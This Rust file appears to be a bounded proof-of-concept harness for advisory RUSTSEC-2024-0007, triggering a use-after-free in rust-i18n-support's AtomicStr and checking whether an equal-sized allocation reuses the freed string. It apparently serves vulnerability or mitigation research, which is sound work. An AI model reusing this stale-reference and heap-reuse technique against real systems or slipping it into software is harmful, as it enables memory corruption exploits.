//! Derived A -> free -> B adapter for RUSTSEC-2024-0007.
//!
//! rust-i18n-support 3.0.0 returns an unguarded `&str` from `AtomicStr`.
//! Replacing the value and dropping the returned old `Arc<String>` reclaims
//! the backing string while that reference remains stale. This bounded adapter
//! immediately requests an equal-layout, semantically distinct `Replacement`
//! before exercising the stale read. Exact address equality is the treatment
//! oracle; the claim stops at this reuse edge.

#![forbid(unsafe_code)]

use rust_i18n_support::AtomicStr;
use std::hint::black_box;
use std::mem::{align_of, size_of};
use std::sync::Arc;

const VICTIM_TYPE_ID: u64 = 0x5253_4842_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4842_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4842_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4842_0000_0004;
const PAYLOAD_SIZE: usize = 4096;

pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

#[repr(transparent)]
struct Replacement([u8; PAYLOAD_SIZE]);

// Keep the allocation and subject handoff at distinct compiler-audited sites.
#[inline(never)]
fn materialize_string(byte: u8) -> String {
    let mut value = String::with_capacity(PAYLOAD_SIZE);
    value.extend(std::iter::repeat_n(char::from(byte), PAYLOAD_SIZE));
    value
}

#[inline(never)]
fn materialize_atomic(value: String) -> AtomicStr {
    AtomicStr::new(value)
}

#[inline(never)]
fn reclaim_value<T>(value: T) {
    drop(value);
}

fn main() {
    assert_eq!(size_of::<Replacement>(), PAYLOAD_SIZE);
    assert_eq!(align_of::<Replacement>(), align_of::<u8>());

    let victim_seed = materialize_string(b'A');
    let materialize: fn(String) -> AtomicStr = materialize_atomic;
    let current = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || black_box(materialize)(victim_seed),
    );
    let stale = current.as_str();
    let original_address = stale.as_ptr() as usize;

    let replacement_seed = materialize_string(b'B');
    let old_owner = current.replace(replacement_seed);
    let reclaim: fn(Arc<String>) = reclaim_value;
    crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || black_box(reclaim)(old_owner),
    );

    let replacement = Box::new(Replacement([0x43; PAYLOAD_SIZE]));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = replacement.0.as_ptr() as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");

    if original_address == replacement_address {
        let observed = black_box(stale.as_bytes()[0]);
        assert_eq!(observed, replacement.0[0]);
    }
    black_box(&replacement.0);
    drop(replacement);
    drop(current);
}
